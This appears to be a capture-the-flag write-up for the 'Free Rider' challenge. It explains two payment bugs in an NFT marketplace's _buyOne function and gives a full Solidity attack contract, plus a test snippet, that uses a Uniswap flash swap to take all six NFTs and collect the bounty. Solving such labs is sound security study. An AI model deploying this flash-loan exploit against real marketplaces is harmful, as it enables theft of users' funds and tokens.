## Goal
You have 0.5 eth and you want to get all the nfts and send them to the buyer to get 45 eth.

## Examining the code
Look at the private function _buyOne we have 2 bugs:
1. require(msg.value >= priceToPay, "Amount paid is not enough"); 15 eth (the price of nft is enough to take them all)
2. payable(token.ownerOf(tokenId)).sendValue(priceToPay); it is paying the owner of the nft after transfering it so the buyer is being paud not the seller

## Exploit
We will make a flashSwap, and get ETH transfer them to WETH and call the buyMany function which will call buyone and get all the nfts then transfer them to the buyer and receive our eth.

## Solution
```solidity
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC721/ERC721.sol";
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Callee.sol";
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol";
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import "@uniswap/v2-core/contracts/interfaces/IERC20.sol";

import "../free-rider/FreeRiderNFTMarketplace.sol";

contract AttackFreeRider is IERC721Receiver,IUniswapV2Callee{
    using Address for address;
    address payable weth;
    address dvt;
    address payable buyerMarketPlace;
    address buyer;
    address nft;
    address factory;
    uint[]  tokenIds = [0,1,2,3,4,5];

    constructor(
        address payable _weth,
        address _factory,
        address _dvt,
        address payable _byerMartketPlace,
        address _buyer,
        address _nft
    )
    {
        weth = _weth;
        factory = _factory;
        buyer = _buyer;
        buyerMarketPlace = _byerMartketPlace;
        nft = _nft;
        dvt = _dvt;
    }

    // Now we will make the flashswap
    function flashSwap(address _tokenToBorrow,uint256 _amount) external {
        //finding a pair between tokenWeWantToBorrow and dvt
        address pair = IUniswapV2Factory(factory).getPair(_tokenToBorrow, dvt);

        address token0 = IUniswapV2Pair(pair).token0();
        address token1 = IUniswapV2Pair(pair).token1();

        // Ensure we are borrowing the correct token (WETH)
        uint256 amount0Out = _tokenToBorrow == token0 ? _amount : 0; // weth
        uint256 amount1Out = _tokenToBorrow == token1 ? _amount : 0; // 0


        //now we want to call the flashswap in uniswap

        bytes memory data = abi.encode(_tokenToBorrow,_amount);

        IUniswapV2Pair(pair).swap(amount0Out, amount1Out, address(this), data);

    }

    function uniswapV2Call(address sender, uint256 amount0,uint256 amount1,bytes calldata data) external override
    {

        // take the tokens sent by the sender which is flashSwap()        
        address token0 = IUniswapV2Pair(msg.sender).token0();
        address token1 = IUniswapV2Pair(msg.sender).token1();
        address pair = IUniswapV2Factory(factory).getPair(token0, token1);

        //decide the data we did in the above function
        (address tokenToBorrow , uint256 amount) = abi.decode(data,(address,uint256));

        //calculate the load
        uint256 fee = ((amount * 3) / 997) + 1;
        uint256 amountToRepay = amount + fee;

        uint256 balance = IERC20(tokenToBorrow).balanceOf(address(this));

        //ETH TO WETH
        tokenToBorrow.functionCall(abi.encodeWithSignature("withdraw(uint256)", balance));
        
        //Get the nfts
        FreeRiderNFTMarketplace(buyerMarketPlace).buyMany{value: 15 ether}(
            tokenIds
        );

        //Send to buyer
        for (uint256 i = 0; i < 6; i++) {
            DamnValuableNFT(nft).safeTransferFrom(address(this), buyer, i);
        }

        (bool success,) = weth.call{value: 15.1 ether}("");
        require(success, "failed to deposit weth");

        // Pay back Loan with deposited WETH funds
        IERC20(tokenToBorrow).transfer(pair, amountToRepay);


    }


    function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) external override pure returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }

    receive () external payable {}
}
```

```javascript
        const attackWeth = this.weth.connect(attacker);
        const attackToken = this.token.connect(attacker);
        const attackFactory = this.uniswapFactory.connect(attacker);
        const attackMarketplace = this.marketplace.connect(attacker);
        const attackBuyer = this.buyerContract.connect(attacker);
        const attackNft = this.nft.connect(attacker);

        const AttackFactory = await ethers.getContractFactory("AttackFreeRider", attacker);
        const attackContract = await AttackFactory.deploy(
            attackWeth.address, 
            attackFactory.address,
            attackToken.address,
            attackMarketplace.address,
            attackBuyer.address,
            attackNft.address,
            );

        await attackContract.flashSwap(attackWeth.address, NFT_PRICE, {
            gasLimit: 1e6
        });
```